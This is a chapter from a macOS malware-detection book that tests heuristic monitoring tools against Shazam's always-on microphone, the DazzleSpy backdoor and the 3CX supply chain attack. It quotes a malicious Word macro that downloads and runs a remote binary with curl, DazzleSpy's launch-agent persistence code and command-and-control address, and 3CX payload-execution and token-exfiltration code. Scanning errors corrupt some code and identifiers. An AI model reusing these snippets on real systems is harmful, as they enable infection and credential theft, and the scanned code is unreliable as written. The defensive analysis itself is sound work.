## 14  CASE STUDIES

![Figure](figures/ArtofMacMalwareVol2_page_345_figure_001.png)

In this final chapter, I showcase a handful of case studies, ranging from good apps misbehaving to sophisticated nation-state attacks.

In each case, I'll demonstrate exactly how the heuristic-based detection approaches discussed throughout this book succeed at uncovering the threat, even without prior knowledge of it.

### Shazam’s Mic Access

About a year after the release of OverSight, the webcam and mic monitor detailed in Chapter 12, I received an email from a user named Phil, who wrote the following: "Thanks to OverSight, I was able to figure out why my mic was always spying on me. Just to let you know, the Shazam widget keeps the microphone active even when you specifically switch the toggle to OFF in their app."

---

Shazam, an app that became popular in the mid-2010s, identifies the name and artist of a song while it plays. To confirm Phil's bold claim (and rule out any bugs in Oversight), I decided to investigate the issue. I installed Shazam on my Mac, then toggled it on, instructing it to listen. Unsurprisingly, this generated an Oversight event indicating that Shazam had activated the computer's built-in microphone.

I then toggled Shazam off. Instead of displaying the expected deactivation alert, OverSight displayed nothing. To determine whether Shazam was indeed still listening, I reverse engineered the app. Examining Shazam's binary code revealed a core class named SHAudioRecorder and seemingly relevant methods named isRecording and stopRecording. In the following debugger output, you can see that I encountered an instance of this class at the memory address 0x100729040. We can introspect this SHAudioRecorder object, and even directly invoke its methods or inspect its properties, to see whether Shazam is indeed still recording:

```bash
(11db) pc [0x10079040 className]
SHiAudioRecorder
```

```bash
(11db) p (BOOL)[0x0100729040 isRecording]
    (BOOL) $i9 = YES
```

Continued analysis revealed that, to stop recording, the stopRecording method would invoke Apple's Core Audio AudioOutputttstop function. So far, so good. However, further investigation appeared to show that Shazam never actually called this method when users toggled off the recording. This strongly implied that Shazam kept the mic active and listening! Indeed, as shown in the debugger output, querying the isRecording property after togging Shazam off shows it still set to YES, the Objective-C value for true.

Apparently, when Shazam's marketing materials claimed the app would "lend its ears to your Mac," they weren't kidding! I reached out to the company, who told me that this undocumented behavior was part of the app's design, and actually benefited the user:

Thanks for getting in touch and bringing this to our attention. The iOS and Mac apps use a shared SDK, hence the continued recording you are seeing on Mac. We use this continued recording on iOS for performance, allowing us to deliver faster song matches to users.

While Shazam initially ignored my concerns, it changed its mind once the media got involved, running pieces with headlines such as "Shazam is always listening to everything you're doing" $^1$ and "Shhh! Shazam is always listening — even when it's been switched 'off." $^12$ In response, Shazam pushed out an update that turned off the microphone when the app was toggled off. $^3$ (Apparently, though, there really is no such thing as bad publicity; the following year, Apple acquired Shazam for $400 million.)

I designed OverSight to detect malware with mict and webcam spray capabilities, such as FruitFly, Crisis, and Mokes, but its malware-agnostic,

314   Chapter 14

---

heuristic-based approach has proven extremely versatile, capable also of identifying a major privacy issue.

Next, we'll consider a more conventional example of malware detection.

## DazzleSpy Detection

DazzleSpy, a malicious specimen mentioned throughout the book, makes for a great case study, as it's not your average, run-of-the-mill malware. This sophisticated, persistent backdoor used zero-day exploits to infect individual supporting pro-democracy causes in Hong Kong. 4 Intrigued by the malware, I performed my own analysis of it 5 and then considered how security tools could have defended against it and other sophisticated macOS threats.

### Exploit Detection

The tools and techniques presented in this book have predominantly focused on detecting malware once it has found its way onto a macOS system. However, these approaches can often detect the malware's initial exploitation vector as well. For example, a process monitor that builds process hierarchies may be able to detect an exploited browser or word prosor spawning a malicious child process. This heuristic-based approach to exploit detection is especially important, as advanced threat actors increasingly deploy their malware via exploits.

Before we focus on DazzleSpy's exploits, let's consider an attack that leveraged a malicious document. Attributed to North Korean nation-state hackers, 6 the Word file contained macro code capable of exploiting a macOS system to persistently install a backdoor. Here is a snippet of the malicious code:

```bash
_________________________________________________________________
sur = "https://nzzsdm.com/assets/mt.dat"
spath = "/tmp/"
i = 0
Do
    spath = spath & Chr(Int(Rnd * 26) + 97)
    i = i + 1
Loop Until i > 12
system("curl -o " & spath & " " & sur)
system("chmod +x " & spath)
popen(spath, "r")
```

You can see that the malicious macro downloads a remote binary, mt.dat, via curl, sets it to be executable, then spawns it using the popen API. Because the malicious macro executes in the context of Word, a process monitor will show curl, chmod, and mt.dat as children of Word. This, of course, is highly anomalous and indicative of an attack.

In the case of DazzleSpy, the exploit chain is far more complex, but it still offers several chances for detection. As part of the chain, an in-memory Mach-O executable code downloads the DazzleSpy backdoor to the

Case Studies 315

---

$SMTPDIR/airportpair directory. After making the backdoor executable, it uses a privilege escalation exploit to remove the con.apple.quarantine extended attribute. This action ensures that the operating system will allow the binary to execute without prompts or alerts, even though it isn't notarized.

As the malicious website hosting the exploit chain is long gone, it's hard to test our detections directly unless we set up our own server hosting the same exploits. Still, a security tool leveraging Endpoint Security events should be able to readily observe and even thwart many actions taken by the exploit that deployed DazzleSpy. For example, as Chapter 9 showed, the

ES_EVENT_TYPE_AUTH_EXEC event type provides a mechanism to authenticate process executions, perhaps blocking any that aren't notarized, especially if the parent is the browser.

Other Endpoint Security events related to the deletion of extended attributes could catch or even block any process attempting to delete

com.apple.quarantine. The example code in Listing 14-1 monitors one of these events, ES_EVENT_TYPE_NOTIFY_DELETEEXATTR, to detect any removal of any extended attribute.

```bash
es_client_t* client = NULL;
es_event_type_t events = {es_EVENT_TYPE_NOTIFY_DELETETEXTATTR}; ❶
es_new_client(&client, *(es_client_t* client, const es_message_t* message) {
    if(ES_EVENT_TYPE_NOTIFY_DELETETEXTATTR == message->event_type) { ❷
        es_string_token_t* procPath = &message->process->executable<path;
        es_string_token_t* filePath = &message->event.deleteextattr.target->path;
        const es_string_token_t* extAttr = &message->event.deleteextattr.extattr;
        printf("ES_EVENT_TYPE_NOTIFY_DELETETEXTATTR\n");
        printf("xattr: %.*s\n", (int)extAttr->length, extAttr->data);
        printf("target file path: %.*s\n", (int)filePath->length, filePath->data);
        printf("responsible process: %.*s\n", (int)procPath->length, procPath->data);
    }
}}  }
es_subscribe(client, events, sizeof(events)/sizeof(events[0]));
```

Listing 14-1: Detecting the removal of the quarantine attribute

We first specify the event of interest, ES_EVENT_TYPE_NOTIFY_DELETETEXTATR, which will notify us of the removal of any extended attributes ( ). (You could also use the authorization event ES_EVENT_TYPE_AUTDELETTEXTATR to block the removal altogether.) This notification event will trigger the callback block , where we extract the responsible process, its filepath, and any extended attributes that the code deleted. We can extract this information from a structure named deletetextattr found in the Endpoint Security event. This structure, of type es_event_deletetextattr_t, is defined in ESMessage.h and has the following members:

```bash
typedef struct {
     es_file_t* _Nonnull target;
     es_string_token_t extattr;
     uint8_t reserved[64];
} es_event_deleteextattr_t
__________________________________________________________________
```

---

When downloaded, whether through a browser exploit chain or manually, DazoleSpy's airportparb binary will have the com.apple.quarantine extended attribute set. You can confirm this with the xattr command, executed with the -l command line flag:

```bash
% xattr -l airportpair
  com.apple.quarantine: 0083:659e4224;Safari;D6E57863-A216-4B5B-ADE8-2ECB300E2075
```

To manually mimic the exploit, delete this attribute by running xattr with the -d flag:

```bash
% xattr -d com.apple.quarantine airportpaird
```

If the monitoring code we wrote in Listing 14-1 is running, you'll receive the following alert:

```bash
# XattrMonitor.app/Contents/MacOS/XattrMonitor
ES_EVENT_TYPE_NOTIFY_DELETETEXTATTR
xattr: com.apple.quarantine
target file path: /var/folders/l2/fsx0dkdxjqq6w71cqshtzp240000gn/T/airportpaird
responsible process: /usr/bin/xattr
```

Many other malware samples remove the com.apple.quarantine extended attribute, including CoinTicker, OceanLotus, and XCSSLET? It's worth noting, however, that legitimate applications, such as installers, may also remove this attribute, so you shouldn't treat a single observation as the sole reason for classifying an item as malicious.

## Persistence

It's also easy to detect DazzleSpy by taking a behavior-based approach focusing on the malware's persistence and network access. Let's start by detecting its persistence, one of the best ways to detect malware. The following decompilation shows DazzleSpy's installDaemon method installing and persisting it as a launch agent:

```bash
+(void)installDaemon {
  ...:
   rax = NSHomeDirectory();
   var_30 = [[NSString stringWithFormat:@"%#/.local", rax] retain];
   var_38 = [[NSString stringWithFormat:@"%/#/softwareupdate", var_30] retain];
   rax = [[NSBundle mainBundle] executablePath];
   var_58 = [NSURL baseURLWithPath:rax];
   var_60 = [NSData dataWithContentsWithURL:var_58];
   [var_60 writeToFile:var_38 atomically:0x1];
   var_78 = [NSString stringWithFormat:@"%/@/Library/launchAgents", rax];
   var_80 = [var_78 stringByAppendingFormat:@"/com.apple.softwareupdate.plist"];
   var_90 = [[NSMutableDictionary alloc] init];
   var_98 = [[NSMutableDictionary alloc] init];
                                             Case Studies    317
```

---

```bash
[var_98 setObject:var_38];
[var_98 setObject:@"01"];
rax = 0YES];
[var_90 setObject:tax forKey:@"RunAtLoad";
[var_90 setObject:tax forKey:@"KeepAlive";
[var_90 setObject:@"com.apple.softwareupdate" forKey:@"Label"];
[var_90 setObject:var_98 forKey:@"ProgramArguments"];
[var_90 writeToFile:var_80 atomically:0x0];
```

You can see that malware first makes a copy of itself to ~/local/software

update, then persists this copy by using the com.apple.softwareupdate.plist launch agent property list.

A file monitor that has subscribed to file I/O Endpoint Security events such as ES_EVENT_TYPE_NOTIFY_CREATE can easily observe this behavior and detect DazzleSpy when it persists. For example, here is the output of the file monitor discussed in Chapter 8:

```bash
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty
...
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
  "file" : {
    "destination" : "/Users/User/Library/LaunchAgents/com.apple.softwareupdate.plist",
    "process" : {
      "pid" : 1469,
      "name" : airportpaird,
      "path" : "/var/folders/lz/fsx0dkdx3jq6w71cqsht2p240000gn/T/airportpaird"
    }
  }
```

Once DazzleSpy has persisted, we can also view the contents of its com.apple.softwareupdate.plist launcher agent property list:

```bash
<?xml version="1.0" encoding="UTF-8"?>
...
<plist version="1.0">
<dict>
    <key>KeepAlive</key>
    <true/>
    <key>Label</key>
    <string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/User/.local/softwareupdate</string>
        <string>1</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>SuccessfulExit</key>
    <true/>
```

318    Chapter 14

---

```bash
</dict>
  </plist>
```

The ProgramArguments key confirms the path to the persistence location of the malicious binary we saw in the decompilation. Also, you can see that the RunLoad key is set to true, meaning that each time the user logs in (at which point the operating system examines launch agents), macOS will automatically restart the malware.

BlockBlock could easily detect this persistence via Endpoint Security file events or the newer ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM_ADD event. Also, because traditional antivirus products have improved their detections, KnockKnock's VirusTotal integrations will now highlight DazzleSpy as malicious, but even if the antivirus signatures failed to flag DazzleSpy as malware (as they did when the malware was initially deployed), KnockKnock could detect DazzleSpy's persistent launch agent, as its Background Task Management plugin reveals all installed launch items.

Furthermore, notice the com.apple prefix to the property list, which suggests that the binary is an Apple updater. Apple hasn't signed the item, however; in fact, the binary is wholly unsigned. (KnockKnock indicates this by showing a question mark next to the item's name.) Taking all this information into consideration, we can conclude that the item is likely malicious and requires thorough investigation.

### Network Access

Unauthorized network access is yet another great way to detect malware, and DazzleSpy is no exception. To receive tasking, DazzleSpy connects to the attacker's command-and-control server at 88.218.192.128. The following snippet of decompilation shows this address is hardcoded into the malware, along with the port, 5633:

```bash
int main(int argc, const char* argv[]) {
    ...
    var_18 = [[NSString alloc] initWithFrameUTF8String:"88.218.192.128:5633"];
```

A network monitor like LuLu, which uses the techniques mentioned in Chapter 7, could easily detect this network access. In its alert, LuLu would capture the unauthorized softwareupdate program's attempt to connect to a remote server listening on a nonstandard port. It would also show that the program isn't signed with a trusted certificate or notarized and that it runs from a hidden directory. Put together, these red flags certainly warrant a closer inspection.

## The 3CX Supply Chain Attack

This last case study puts our tools and techniques against what are widely considered to be some of the most challenging attacks to detect: supply

Case Studies  319

---

chain attacks. These damaging cybersecurity incidents can infect a massive number of unsuspecting users by compromising trusted software. Although most supply chain attacks impact Windows-based computers, there has been a noticeable uptick of such attacks against the open source community 8 and macOS. Here, we'll focus on the 2023 nation-state attack discussed several times in the book, which targeted the popular private branch exchange (PBX) software provider 3CX.

Believed to be the first chained supply chain attack (in which the attackers gained initial access to 3CX through a separate supply chain attack), attackers subverted both the Windows and Mac versions of 3CX's application. The attackers then signed the trojanized application with 3CX's own developer certificate and submitted it to Apple, which inadvertently notarized it. Finally, macOS enterprise users downloaded the suberted application en masse, without suspecting that anything was amiss.

Supply chain attacks are incredibly difficult to detect. The legitimate macOS 3CX application contained more than 400MB of code spread across more than 100 files, so identifying a malicious component to confirm its subversion was like searching for a needle in a haystack. You can read more about this search in my write-up, where I both confirmed the subversion of the macOS app and pinpointed the single library within the app that hosted the attacker's malicious code. $^9$

Understandably, even large cybersecurity companies struggle with such detections: SentinelOne initially noted that it couldn't confirm whether the macOS version of the 3CX app was impacted by the attack. 10 Also, Apple's scans missed the subversion of the infected installer, resulting in the inadvertent granting of a notarization ticket.

Still, it's quite possible to detect supply chain attacks by observing anomalous or unusual behaviors. CrowdStrike, the first organization to confirm the 3CX attack on Windows, 11 used this behavior-based approach. 12 Let's consider the detection methods that could uncover this and other supply chain attacks. When taken together, various anomalies paint a very clear picture that something is amiss.

## File Monitoring

The malicious code added to the 3CX app's legitimate libffinppeg.dylib library had two simple goals: gather information about the infected host, then download and execute a second-stage payload. As part of the first activity, the malware also generated an identifier to uniquely identify the infected host and wrote it to a hidden, encrypted file. _main_storage. 15 Here is a snippet of decompilation from a function in the subtverted libffinppeg.dylib library that opens the file, encrypts the information, and then writes it to disk:

```bash
♦rax = fopen(file, "wb");
    if (rax != 0x0)
        rbx = rax;
        rax = 0x0;
  ♦do {
        *(r14 + rax) = *(r14 + rax) ^ 0x7a;
```

320    Chapter 14

---

```bash
rax = rax + 0x1;
    } while (rax != 0x38);
  @ fwrite(r14, 0x38, 0x1, rbx);
    fflush(rbx);
    fclose(rbx);
```

In the decompilation, you can see the file being opened with the fopen API. The filename is hardcoded in the malware but not shown in the decompilation, as the code dynamically creates the full path and then passes it into the function. Once it has opened the file, the malware XOR encrypts a buffer pointed to by the r14 register using a hardcoded key, 0x7a7b. Then it writes the encrypted buffer to the file with the fwrite API.

Using a file monitor, you could observe the malware opening and writing to this hidden file:

```bash
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter "3CX Desktop App"
  { "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
    "file" : {
      "destination" :
        "/Users/User/Library/Application Support/3CX Desktop App/:main_storage",
    "process" : {
        "pid" : 40029,
        "name" : "3CX Desktop App",
        "path" : "\\/Applications/3CX Desktop App\/Contents\/MacOS\/3CX Desktop App"
    }
    }
...
  { "event" : "ES_EVENT_TYPE_NOTIFY_WRITE",
    "file" : {
      "destination" :
        "/Users/User/Library/Application Support/3CX Desktop App/:main_storage",
    "process" : {
        "pid" : 40029,
        "name" : "3CX Desktop App",
        "path" : "\\/Applications/3CX Desktop App\/Contents\/MacOS\/3CX Desktop App"
    }
    }
```

If you manually examine _main_storage with the macOS hexdump utility, you can see that it clearly appears obfuscated or encrypted:

```bash
# ##hexdump -C ~/Library/Application/Support/3CX/Desktop/App/.main_storage
00000000  1c 19 1e 4f 1f 4e 2a 1b 57 1b 1b 4c 43 57 49 43 ||...O.CN.W..LCVlC
00000010  49 1c 57 4f 49 1f 4e 57 4f 1f 4b 4a 4f 4d 1b 4c |I.NO.L.NWO.KJOM.L|
00000020  4b 4c 1c 4b 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a |KL.Kzzzzzzzzzzzzz|
00000030  05 0c ee 1e 7a 7a 7a 7a 7a
```

Case Studies 321

---

By flagging the creation of hidden files, especially those that contain encrypted content, we'd quickly notice that the 3CX application was acting very strangely. One way to detect that a file is encrypted is to compute the file's entropy. This process is computationally intensive, so we wouldn't want to do this for every file, but checking hidden files might be a good start!

## Network Monitoring

Once the malware has generated an ID for the victim and completed a basic survey of the infected system, it sends this information to its command-andcontrol server. The resulting network traffic gives us yet another heuristic with which to detect that something is amiss. However, the 3GX application accesses the network to accomplish its legitimate functionality, so to detect its subversion, we'd need to observe it communicating with new, malicious endpoints.

In fact, this is how users noticed the supply chain attack in the first place. The first reports of odd behavior appeared on 3CX forums, where customers posted about unusual network traffic emanating from the application. For example, one customer noticed a connection to the msslongboxes.com DNS host, an unrecognized domain that had just been registered in RevKjavik. $^14$ The DNSMonitor tool described in Chapter 13 lets us observe this DNS traffic:

```bash
% /Applications/DNSMonitor.app/Contents/MacOS/DNSMonitor
{   "Process" : {
        "pid" : 40029,
        "name" : "3CX Desktop App",
        "path" : "\i/Applications/3CX Desktop App/\Contents/\MacOS/\3CX Desktop App"
    },
    "Packet" : {
        "Opcode" : "Standard",
        "OR" : "Query",
        "Questions" : [
        {
            "Question Name" : "1648.3cx.cloud",
            "Question Class" : "IN",
            "Question Type" : "AAAA"
        }
        ],
        ...
    }
...
{   "Process" : {
        "pid" : 40029,
        "name" : "3CX Desktop App",
        "path" : "\i/Applications/3CX Desktop App/\Contents/\MacOS/\3CX Desktop App"
    },
    "Packet" : {
    "QR" : "Query",
322   Chapter 14
```

---

```bash
"Questions" : [
    "Question Name" : "msstorageboxes.com",
    "Question Class" : "IN",
    ...
```

These two requests attempt to resolve the domains 1648.3cx.cloud and mssstorageboxes.com . How might you classify these endpoints as legitimate or anomalous? As discussed in the previous chapter, general approaches include examining historical DNS records, WHOIS data, and any SSL/TLS certificates. $^15$ These data points look normal for the 3cx.cloud domain (which is part of 3CX's infrastructure), but the mssstorageboxes.com domain raises some serious red flags.

## Process Monitoring

Once the malicious code in libffmpeg .pylib has resolved the address of the command-and-control server, it checks in with the server by submitting the generated UUID and basic survey data it has collected from the infected host. Then it downloads and executes a second-stage payload, which provides even more opportunities to heuristically detect this stealthy attack. The following snippet of decompiled code from libffmpeg .pylib shows the malware writing out the second-stage payload and then executing it:

```bash
# sprintf(&var_2f18, "%s/UpdateAgent", &var_1Df8);
r13 = &var_2f18;
# rax = fopen(r13, "wb");
if (rax != 0x0)
    # fwrite(var_23f8 + 0x4, var_23f8 - 0x4, 0x1, file);
    ...
    # chmod(r13, 7550);
        sprintf(r12, rbp, &r13);
    # rax = popen(r12, "r");
    ...
```

The malware builds a full path for the payload within the 3CX desktop app's Application Support directory. You can see that the name of the payload is hardcoded as UpdateAgent . Next, it opens the file in write binary mode ❹ and writes the bytes of the payload it received from the attackers’ command-and-control server ❹ . After changing its permissions to executable ❹ , the malware invokes the sprintf API to create a buffer with the path to the saved UpdateAgent binary stored in the r13 register ❹ and the suffix >dev/null >81 . This suffix, not shown in the decompilation, will redirect any output or errors from the payload to /dev/null . Finally, the malware executes the payload ❹ .

By the time researchers discovered the supply chain attack, the attackers' command-and-control servers were offline, so we can't observe the attack in real time. However, we could emulate it by configuring a host to resolve mstorageboxes.com to a server we control, then serve a sample of the second-stage payload from an infected victim. This setup would allow us

Case Studies 323

---

to understand what information our monitoring tools could capture about this surreptitious infection.

For example, the process monitoring code from Chapter 8 would capture the following:

```bash
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty
   { "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
     "process" : {
        "pid" : 5115,
        "name" : "UpdateAgent",
        "path" : "/Users/User/Library/Application Support/3CX Desktop App/UpdateAgent",
        "signing info (computed) : {
            "signatureStatus" : 0,
            "signatureSigner" : "AdHoc",
            "signatureID" : "payload2-55554944839216049d683075bc3f5a8628778b88"
        },
        "ppid" : 40029,
        ...
    }
}
```

Recall that the popen API executed the second-stage payload in the shell. Even so, its parent ID (in this instance, 40029) will still identify the 3CX desktop app instance. The fact that the 3CX desktop app is spawning additional processes is slightly suspicious; the fact that this process's binary, UpdateAgent, is signed in an ad hoc manner, rather than with a trusted certificate, is a huge red flag:

```bash
# coding -dvvv UpdateAgent
Executable=/Users/User/Library/Application Support/3C Desktop App/UpdateAgent
Identifier=payload=5555494483216049d8307bc5f3a58628778b8b
CodeDirector=y=20100 size=450 flags=0x02(adhoc) hashes=6+5 location=embedded
```

As in the case of DazzleSpy, initial payloads are often signed with a developer certificate as well as notarized, allowing them to run with ease on recent versions of macOS. However, secondary payloads often aren't. Nor do they need to be, if they're downloaded and executed by malicious code running on the operating system. However, most legitimate software is signed, so you should closely examine any non-notarized third-party software, or even block it altogether.

Currently, BlockBlock blocks only non-notarized software that macOS has quarantined. However, you could modify the tool to allow only notarized third-party software to execute. To do so, you could register an Endpoint Security client and subscribe to ES_EVENT_TYPE_AUTH_EXEC events. If a new process is validly signed and notarized, you could return ES_AUTH _RESULT_ALLOW to allow it to execute. Otherwise, you could return the value

ES_AUTH_RESULT_DENY, blocking the process. Keep in mind, however, that core platform binaries aren't notarized.

---

BlockBlock always allows platform binaries, which you can identify using the is_platform binary member of the Endpoint Security es_process_t structure. Also, applications from the official Mac App Store aren't notarized, although Apple scans them for malware. To determine whether an application came from the Mac App store, use the following requirement string: anchor apple generic and certificate leaf [subject.CN] = "Apple Mac OS Application Signing".

## Capturing Self-Deletion

The UpdateAgent binary performs other suspicious actions we could detect.


For example, it self-deletes. After forking, the child instance invokes the


unlink API with the value argv[0], which holds the path of the process's binary:

```bash
int main(int argc, const char* argv[]) {
    ...        if(fork() == 0) {
        ...        unlink(argv[0]);
```

Malware is rather fond of self-deletion, as removing the binary from disk can often thwart analysis. Even for security tools, macOS doesn't provide an effective way to capture memory images of running processes. In fact, at least one security company whose product tracked process launches failed to obtain the UpdateAgent binary, which had self-deleted by the time an analyst tried manually to collect it. Similarly, traditional signature-based antivirus scanners require an on-disk file to scan and will fail if they don't find one. Luckily, an anonymous user was kind enough to share the binary with me, leading to its detailed analysis in my write-up. $^16$

For heuristic-based detection approaches, however, self-deleted binaries are both easy to detect and a big red flag. Detecting self-deleted binaries is easy to do with a file monitor; just look for a deletion event in which the process path matches the path of the file being deleted, as in the following output:

```bash
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter UpdateAgent
  { "event" : "ES_EVENT_TYPE_NOTIFY_UNLINK",
    "file" : {
      "destination" : "/Users/User/Library/Application Support/3CX Desktop App/UpdateAgent",
      ...,
      "process" : {
        "pid" : 51115,
        "name" : "UpdateAgent",
        "path" : "/Users/User/Library/Application Support/3CX Desktop App/UpdateAgent"
    }
    }
```

Notice that the two paths to the UpdateAgent binary match.

---

## Detecting Exfiltration

After self-deleting, UpdateAgent extracts information from both a legitimate 3CX configuration file and the .main _ storage file created by the first-stage component, libfwnpdpylib . In its send _ post function, the malware then transmits this information to another command-and-control server, sbma.wiki :

```bash
__________________________________________________________________________________________
parse_json_config(...);
read_config(...);
enc_text(&var_460, &var_860, rdx);
sprintf(&var_1060, "3cx_auth_id=%s;3cx_auth_token_content="
%; __tutma=true", &var_58, &var_860);
send_post("https://sbmsa.wiki/blog/_insert", &var_1060, &var_1064);
```

This transmission is arguably the easiest action of the entire supply chain attack to detect and, more importantly, to classify as anomalous, for many of the reasons already discussed. First, a network extension (such as DNSMonitor) can easily detect a new network event and tie it back to the responsible process. In this case, the responsible process, UpdateAgent, was recently installed, signed in an ad hoc manner, and non-notarized. Moreover, the process has self-deleted. Finally, the domain sbma.wiki appears suspicious due to characteristics such as a lack of historical DNS records, choice of registrar, and more.

The alert from LuLu shown in Figure 14-1, triggered by the malware attempting to connect to the attacker's remote server, captures many of these anomalies. For instance, strikethrough process names indicate selfdeletion, while the perplexed frowning face signifies that the malware has an untrusted signature.

![Figure](figures/ArtofMacMalwareVol2_page_358_figure_005.png)

Figure 14-1: A LwU alert shows a self-deleted binary with an untrusted signature attempting to access the network.

Supply chain attacks are notorious for being very challenging to detect and having an extensive impact. Nevertheless, as demonstrated here, monitoring tools that leverage heuristics can identify anomalous behaviors associated with these complex attacks, leading to their detection.

326   Chapter 14

---

## Conclusion

Whenever we make bold claims about our tools' detection capabilities, especially regarding yet-to-be-discovered threats, we must back them up. In this last chapter, we pitted the tools and detection approaches presented throughout the book against the latest and most insidious threats targeting macOS systems. Although we didn't have prior knowledge of these threats, our heuristic-based detections performed admirably. This confirms the power of behavior-based heuristics in identifying both existing and emerging threats, as we've demonstrated in this final section and throughout the book. More importantly, you now have the knowledge and skills to write your own tools and heuristics, empowering you to defend against even the most sophisticated macOS threats of the future.

## Notes

1. "Shazam Is Always Listening to Everything You're Doing," New York Post, November 11, 2016, https://hyppost.com/2016/11/15/shazam-is-always-listening-to-everything-your-doing/.

2. John Leyden. "Shhh! Shazam Is Always Listening—Even When It's Been Switched 'Off'." The Register, November 16, 2016, https://www.theregister .com/2016/11/15/shazam_listening/.

3. You can read more about the reversing of the Shazam faux pas in Patrick Wardle, "Forget the NSA, It's Shazam That's Always Listening!" ObjectiveSee, November 14, 2016, https://objective-see.org/blog/blog_0x13.html .

4. Marc-Étienne M. Léveille and Anton Cherepanov, "Watering Hole Deploys New macOS Malware, DazzleSpy, in Asia," WebLiveSecurity, January 25, 2022, https://www.weblivesecurity.com/2022/01/25/watering-hole -deploys-new-macos-malware-dazzlespy-asia/.

5. Patrick Wardle, "Analyzing OSX.DazzleSpy," Objective-See, January 25, 2022, https://objective-see.org/blog/blog_0x6D.html .

6. Phil Stokes, “Lazarus APT Targets Mac Users with Poisoned Word Document,” SentinelOne, April 25, 2019, https://www.sentinelone.com/labs/ lazarus-apt-targets-mac-users-with-poisoned-word-document/ .

7. "Subvert Trust Controls: Gatekeeper Bypass." Mitre Attack, https://attack. mitre.org/techniques/T1553/001/ .

8. "Malicious Code Discovered in Linux Distributions," Kaspersky, March 31, 2024, https://www.kaspersky.com/blog/cve-2024-3094-vulnerability-backdoor/ 50873/ .

9. Patrick Wardle, “Ironing Out (the macOS) Details of a Smooth Operator (Part I),” Objective-See, March 29, 2023, https://objective-see.org/blog/blog _0x73.html .

---

10. Juan Andres Guerrero-Saade, “SmoothOperator | Ongoing Campaign – Trojanizes 3CX Software in Software Supply Chain Attack,” SentinelOne, March 29, 2023, https://web.archive.org/web/2023029231830/https://www. sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-softwarein-software-supply-chain-attack/.

11. Bart Lenaerts-Bergmans “What Is a Supply Chain Attack?” CrowdStrike, September 97, 2023, https://www.crowdstrike.com/cybersecurity-101/cyberattacks/supply-chain-attacks/ .

12. CrowdStrike (@CrowdStrike), "CrowdStrike Falcon Platform detects and prevents active intrusion campaign targeting 3CXDesktopApp customers," X, March 29, 2023, https://x.com/CrowdStrike/status/16411675 08215349249 .

13. "Smooth Operator," National Cyber Security Centre, June 29, 2023, https://www.nsc.gov.uk/static/assets/documents/malware-analysis-reports/ smooth-operator/NCSC_MAR-Smooth-Operator.pdf .

14. "Threat Alerts from SentinelOne," 3CX Forums, March 29, 2023, https:// www.3cx.com/community/threats/threat-alerts-from-sentinelone-for-desktop -update-initiated-from-desktop-client.119806/post-558710 .

15. Esteban Borges, "How to Perform Threat Hunting Using Passive DNS," Security Trails, January 31, 2023, https://securitytrails.com/blog/threat-hunting -using-passive-dns.

16. See Patrick Wardle, “Ironing Out (the macOS) Details of a Smooth Operator (Part II),” Objective-See, April 1, 2023, https://objective-see.org/ blog/blog_0x74.html .

---

## INDEX

### A

Activity Monitor utility, 8, 30–31, 33–34, 46 addObserver:selector:name:Object:

method, 286–287

advanced persistent threats (APTs), 13–14, 104–105.

See also persistence Æ sockets, 105 Alchimist attack framework, 103 AMFI. See Apple Mobile File Integrity analyzing malware safety, xxvii–xxviii anchor apple generic requirement, 94 anchor apple requirement, 94, 96–97 app IDs, registering, 254–255 Apple File System (APFS), xxviii Apple Mobile File Integrity (AMFI), 181, 254 disabling, xxvii, 160, 181 entitlements and, xvii Application Services APIs, 17–19 APTs (advanced persistent threats), 13–14, 104–105. See also persistence ARC (automatic reference counting), 18, 211 arguments, process, 9–13, 197–199 ARM binaries, 52 Art of Mac Malware, The , Volume 1 (Wardle), xxv audio monitoring Oversight tool, 282–285 Shazam widget, 313–315 audit tokens, 5–6 Endpoint Security process monitor, 192 mute inversion via, 210 obtaining code object references via, 95–96 XPC and, 266–268

1

authorization events, Endpoint Security, 213–222 blocking Background Task Management bypasses, 219–222 checking binary origins, 217–219 meeting message deadlines, 215–217 origin of, 183 subscribing to, 213–215 automatic reference counting (ARC), 18, 211 bridging, 80 AutoRuns tool, 233 AVFoundationAudioObjectAddProperty ListenerBlock API, 282 AVFoundation framework, 58 adding a property listener, 283–284 device enumeration, 281 extracting property values, 285 property listener block, 282 removing a property listener, 294

### B

Background Task Management (BTM), 2, 123–136 accessing metadata, 134–135 BlockBlock tool and, 261–265 blocking bypasses, 219–222 deserialization, 130–134 DumpBTM project, 130–137 event monitoring logic, 263 finding database path, 130–131 identifying malware, 135–136 initWithCoder: methods, 132–134 interaction with database, 124–127 ItemRecord class, 131–133 itemsByUserIdentifier dictionary, 131 KnockKnock tool and, 241–242


1

---

Background Task Management (continued) serialization, 126–127 sfltool utility, 127–130 behavior-based heuristics. See also heuristic-based detection approach defined, xxii false positives, 75 binaries. See also Mach-O binaries encrypted, 70–71 packed binaries, 62–70 universal binaries, 39–50 Black Mirror (TV show), 279 BlockBlock tool, 253–276 alerts, 257 Background Task Management, 261–265 DazzleSpy and, 319 Endpoint Security and, 181 entitlements, 254–256 launch daemon, 257–258 login item, 257 message deadlines and, 216 notarization mode, 213 plug-ins, 258–261 3CX supply chain attack, 324–325 XPC, 265–276 blocking DNS traffic, 307–310 closing local flow, 309 closing remote flow, 309 extracting answers from A record, 308–309 name error, 309 NXDOMAIN response, 309–310 response packets, 308 saving DNS questions and answers to cache, 305 bridging, 80 browser extensions, 242–245 BTM. See Background Task Management

## C

CalendarFree.app, 10–13 callback logic, 114–115 camera monitoring, 285–286, See also Oversight tool webcam, 142, 279–280

